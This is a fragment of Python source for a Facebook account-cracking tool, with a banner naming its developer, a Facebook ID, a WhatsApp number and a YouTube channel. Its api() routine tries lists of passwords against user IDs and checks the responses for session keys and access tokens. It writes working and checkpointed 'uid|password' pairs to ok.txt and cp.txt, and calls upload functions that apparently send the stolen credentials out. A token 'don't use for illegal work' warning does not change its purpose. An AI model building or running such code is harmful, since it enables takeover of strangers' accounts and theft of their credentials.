...
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' 
 > \033[0;92mDEVELOPER     : OSAMA
 > \033[0;95mFACEBOOK ID   : OSAMA-1982
 > \033[0;41mWHATSAPP      : +218912537778
 \033[0;96m> YOUTUBE       : OSAMA-ZAMZAM
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
        ...
        print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s(FREE)" % (G, R, G, Y, G))
        print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s(FREE)" % (G, R, G, Y, G))
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write(
            "\r\r %s[>_] [OSAMA] : %s/%s -> \033[0;92m [ OSAMA-OK:%s ]- \033[0;93m[OSAMA-CP:%s ]" % (
        ...
        for pw in pwx:
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                ...
                open("ok.txt", "a").write(" [OSAMA-OK😍] %s|%s\n" % (uid, pw))
                uploadoks()
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;93m[OSAMA-CP😭] %s|%s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("cp.txt", "a").write(" [OSAMA-CP😭] %s|%s\n" % (uid, pw))
                uploadcps()
                break
            else:
                continue
